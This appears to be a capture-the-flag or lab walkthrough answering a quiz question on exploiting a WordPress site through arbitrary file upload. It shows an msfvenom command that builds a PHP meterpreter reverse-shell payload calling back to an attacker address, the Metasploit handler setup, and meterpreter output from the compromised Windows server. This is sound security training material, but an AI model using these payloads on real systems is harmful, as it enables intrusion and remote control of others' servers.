## 13 What type of vulnerability can be exploited on the WordPress site to obtain a reverse shell?

Command Injection

SQL Injection

| __Arbitrary File Upload__

RCE

```bash
root@kali:~/wordpress# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4411 -f raw -o evil.php
```

```bash
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp


meterpreter > sysinfo
Computer    : WINSERVER-01
OS          : Windows NT WINSERVER-01 6.3 build 9600 (Windows Server 2012 R2 Standard Edition) AMD64
Meterpreter : php/windows
```

```bash
meterpreter > ls c:/Users
Listing: c:/Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2021-12-31 15:20:14 +0530  Administrator
40777/rwxrwxrwx   4096  dir   2022-04-18 15:07:52 +0530  All Users
40555/r-xr-xr-x   8192  dir   2021-12-31 13:30:58 +0530  Default
40555/r-xr-xr-x   8192  dir   2021-12-31 13:30:58 +0530  Default User
40555/r-xr-xr-x   4096  dir   2014-05-21 08:19:18 +0530  Public
100666/rw-rw-rw-  174   fil   2013-08-22 21:07:57 +0530  desktop.ini
40777/rwxrwxrwx   8192  dir   2022-04-18 13:10:37 +0530  mike
```